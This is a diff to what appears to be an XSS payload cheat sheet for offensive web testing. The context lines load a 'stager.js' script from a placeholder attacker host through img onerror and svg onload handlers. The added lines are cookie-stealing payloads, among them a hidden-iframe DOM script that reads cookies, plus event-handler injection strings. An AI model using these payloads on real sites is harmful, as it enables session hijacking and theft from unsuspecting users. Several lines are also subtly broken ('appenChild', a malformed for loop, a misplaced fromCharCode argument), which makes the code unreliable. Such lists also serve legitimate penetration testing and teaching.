@@ -6029,6 +6029,23 @@ sudo python -m SimpleHTTPServer 80
 <img/onerror="var s=document.createElement('script');s.src='http://attacker_IP_here/stager.js'; document.getElementsByTagName('head')[0].appenChild(s);" src=a />
 <svg/onload=body.appendChild(document.createElement`script`).src='http://attacker_IP_here/stager.js' hidden />
 
+# basic payload cookie stealing
+alert(document.cookie);
+
+# cookie stealing via DOM
+## .html file
+<script>
+function cookiepath(path){
+  for (var i = 0; i < window.frames.length; i++;){
+    frameURL = window.frames[i].location.toString();
+    if (frameURL.indexOf(path) > 1){
+      alert(window.frames[i].document.cookie);
+    }
+  }
+}
+</script>
+<iframe onload="cookiepath('/app_path_here/')" style="display:none;" src="/app_path_here/index.php"></iframe>
+
 # steal anti-CSRF token from DOM
 <script>document.addEventListener("DOMContentLoaded",()=>alert(csrf.value))</script><link/rel="
 
@@ -6054,6 +6071,8 @@ document.body.innerHTML="some_defacing_here";
 # action-based / DOM events
 "><body onload="alert(1)">
 " onload="javascript:alert(1)
+" onload="alert('XSS')
+" onload="alert(String.fromCharCode()88,83,83) #'XSS'
 
 ```
 
